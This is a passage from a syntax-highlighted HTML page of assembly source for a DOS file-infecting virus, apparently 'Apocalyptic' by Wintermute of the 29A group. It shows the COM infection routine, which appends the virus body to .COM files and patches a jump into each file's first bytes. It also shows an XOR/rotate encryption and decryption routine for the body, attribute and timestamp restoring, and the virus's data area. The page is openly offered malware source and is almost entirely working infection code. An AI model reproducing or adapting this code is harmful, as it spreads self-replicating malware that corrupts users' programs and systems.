                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">

</span><span class="sc5">close_ant</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">


</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; Attributes</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">

</span><span class="sc5">nahyuck</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">; Restores Int 24h y 3h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">saltito</span><span class="sc0">

</span><span class="sc5">Pointerant</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
</span><span class="sc5">Pointer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                             COM INFECTION</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">


</span><span class="sc5">infeccion_com</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; Open</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">      </span><span class="sc1">; To make the virus know it's</span><span class="sc0">
                                                </span><span class="sc1">;a com when restoring</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; Time/date</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_ant</span><span class="sc0">

</span><span class="sc5">quesiquevale</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; Reads beggining of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ss_sp</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pointerant</span><span class="sc0">              </span><span class="sc1">; Lenght check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">puedes_seguir</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">0ffffh</span><span class="sc4">-</span><span class="sc5">virus_size</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jna</span><span class="sc0">     </span><span class="sc5">puedes_seguir</span><span class="sc0">
</span><span class="sc5">alnoin</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">noinz</span><span class="sc0">

</span><span class="sc5">puedes_seguir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy</span><span class="sc0">                    </span><span class="sc1">; Appending</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pointer</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Jumping to code at</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">salt</span><span class="sc0">                 </span><span class="sc1">;beggining</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_ant</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                                  DATA</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">autor</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Apocalyptic by Wintermute/29A'</span><span class="sc0">
</span><span class="sc5">comtxt</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'COM'</span><span class="sc0">
</span><span class="sc5">flag</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">salt</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
</span><span class="sc5">cabecera</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SS_SP</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CS_IP</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Cequis</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Encrypt_end</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">copy</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">; Don't let bp fuck us</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encryptant</span><span class="sc0">              </span><span class="sc1">; Encrypts</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Copies</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">letsrock</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">deencrypt</span><span class="sc0">               </span><span class="sc1">; Deencrypts</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                           ENCRYPT ROUTINE</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">encryptant</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">encrypt_end</span><span class="sc0">          </span><span class="sc1">; Encrypts</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc0">
</span><span class="sc5">enc_loop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">enc_loop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">deencrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">encrypt_end</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Deencrypts</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">encri</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encri</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Int24h</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Saltito</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">int21h</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">tomacha</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">encrypt_start</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">deencrypt</span><span class="sc4">-</span><span class="sc5">encrypt_start</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
                        </span><span class="sc1">; This is cause I don't like putting a stupid flag,</span><span class="sc0">
                        </span><span class="sc1">; this two commands won't be copied</span><span class="sc0">

        </span><span class="sc5">CODIGO</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">Letsrock</span><span class="sc0">

 </span><span class="sc5">VSTACK</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc5">STACK</span><span class="sc0"> </span><span class="sc12">'Stack'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">

</span></div></body>
</html>
